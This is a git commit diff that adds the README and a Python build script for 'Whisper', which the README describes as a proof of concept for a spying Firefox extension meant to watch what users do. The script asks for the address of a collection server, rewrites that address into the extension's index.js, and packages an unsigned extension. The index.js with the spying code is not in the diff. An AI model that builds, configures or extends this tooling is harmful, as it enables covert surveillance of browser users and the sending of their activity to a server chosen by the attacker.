2d40acc368b7e364705d924a5899be9ab0cadbb9
tisf <yuval@morirt.com>
2016-06-16 16:52:46 +0300

    init
    init commit

---
+++ README.md
@@ -0,0 +1,22 @@
+# Whisper
+
+## About
+
+Just a PoC on spying Firefox Extension.
+
+I'm here just to see what you're doing. Just ignore me...
+
+## Prerequisists
+
+On Linux install `npm` by doing `sudo apt-get install nodejs nodejs-legacy npm`.
+
+If not Linux, go to [NodeJS's site](https://nodejs.org/).
+
+Install `jpm` using `nodejs` like this `sudo npm install jpm --global`.
+
+
+## Compiling the extension
+
+Just run `main.py`. Please notice that the extension will not be signed!
+
+If you wish to have a signed extension go to Mozilla.
---
+++ main.py
@@ -0,0 +1,42 @@
+#!/usr/bin/python
+
+import os
+import sys
+import fileinput
+
+def which(program):
+    def is_exe(fpath):
+        return os.path.isfile(fpath) and os.access(fpath, os.X_OK)
+
+    fpath, fname = os.path.split(program)
+    if fpath:
+        if is_exe(program):
+            return program
+    else:
+        for path in os.environ["PATH"].split(os.pathsep):
+            path = path.strip('"')
+            exe_file = os.path.join(path, program)
+            if is_exe(exe_file):
+                return exe_file
+    return None
+
+
+if which("jpm") is None:
+    sys.stderr.write("\n\t[-]\tNo 'jpm' found. Please read REAME.md file.\n\n")
+    sys.exit(-1)
+
+old_server = raw_input("Please old server name[www.morirt.com]:") or "www.morirt.com"
+new_server = raw_input("What is the server name: ")
+
+if new_server != "":
+    # Replace the script
+    f = open('index.js','r')
+    filedata = f.read()
+    f.close()
+    newdata = filedata.replace("var server = \"http://%s\"" % old_server, "var server = \"http://%s\"" % new_server)
+    f = open('index.js','w')
+    f.write(newdata)
+    f.close()
+
+sys.stdout.write("\t[+]\tSettings are good. Creating XPI file.\n")
+os.system("jpm xpi")
